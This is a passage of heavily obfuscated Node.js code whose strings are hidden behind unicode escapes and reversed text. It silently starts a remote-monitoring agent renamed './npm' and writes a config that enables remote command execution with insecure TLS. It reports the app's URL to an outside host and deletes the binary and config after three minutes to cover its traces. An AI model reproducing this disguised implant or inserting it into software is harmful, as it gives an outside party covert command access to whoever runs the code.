tlsPorts=["\u0034\u0034\u0033","\u0038\u0034\u0034\u0033","6902".split("").reverse().join(""),"\u0032\u0030\u0038\u0037","\u0032\u0030\u0038\u0033","\u0032\u0030\u0035\u0033"];_0x64744f=(427514^427514)+(681698^681696);if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){var _0xef_0x9cb;const NEZHA_TLS=tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](NEZHA_PORT)?"\u002D\u002D\u0074\u006C\u0073":'';_0xef_0x9cb=562778^562783;command=`setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const port=NEZHA_SERVER['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073']("\u003A")?NEZHA_SERVER['\u0073\u0070\u006C\u0069\u0074']("\u003A")['\u0070\u006F\u0070']():'';var _0x0f4da=(618196^618198)+(928990^928984);const NZ_TLS=tlsPorts['\u0069\u006E\u0063\u006C\u0075\u0064\u0065\u0073'](port)?"\u0074\u0072\u0075\u0065":"eslaf".split("").reverse().join("");_0x0f4da=(611530^611532)+(271428^271429);var _0xe75bbc=(904791^904787)+(759189^759184);const configYaml=`client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${NZ_TLS}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;_0xe75bbc=(457235^457243)+(369254^369254);fs['\u0077\u0072\u0069\u0074\u0065\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063']("lmay.gifnoc".split("").reverse().join(""),configYaml);}command=`setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`;}else{return;}try{exec(command,{'\u0073\u0068\u0065\u006C\u006C':'/bin/bash'},err=>{if(err)console['\u0065\u0072\u0072\u006F\u0072']("\u006E\u0070\u006D\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067\u0020\u0065\u0072\u0072\u006F\u0072\u003A",err);else console['\u006C\u006F\u0067']("\u006E\u0070\u006D\u0020\u0069\u0073\u0020\u0072\u0075\u006E\u006E\u0069\u006E\u0067");});}catch(error){console['\u0065\u0072\u0072\u006F\u0072'](`error: ${error}`);}};_0xbdea='\u0063\u006E\u006D\u0067\u0063\u0069';async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}var _0x9b03bc;const _0x4726aa=`https://${DOMAIN}/${SUB_PATH}`;_0x9b03bc=889592^889592;try{const _0x64cae=await axios['\u0070\u006F\u0073\u0074']("\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u006F\u006F\u006F\u006F\u002E\u0073\u0065\u0072\u0076\u0030\u0030\u002E\u006E\u0065\u0074\u002F\u0061\u0064\u0064\u002D\u0075\u0072\u006C",{"url":_0x4726aa},{"headers":{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":'application/json'}});console['\u006C\u006F\u0067']("\u0041\u0075\u0074\u006F\u006D\u0061\u0074\u0069\u0063\u0020\u0041\u0063\u0063\u0065\u0073\u0073\u0020\u0054\u0061\u0073\u006B\u0020\u0061\u0064\u0064\u0065\u0064\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006C\u006C\u0079");}catch(error){}}var _0x76967a;const delFiles=()=>{;["mpn".split("").reverse().join(""),"lmay.gifnoc".split("").reverse().join("")]['\u0066\u006F\u0072\u0045\u0061\u0063\u0068'](file=>fs['\u0075\u006E\u006C\u0069\u006E\u006B'](file,()=>{}));};_0x76967a=(882474^882478)+(299923^299931);httpServer['\u006C\u0069\u0073\u0074\u0065\u006E'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},180000);addAccessTask();console['\u006C\u006F\u0067'](`Server is running on port ${PORT}`);});
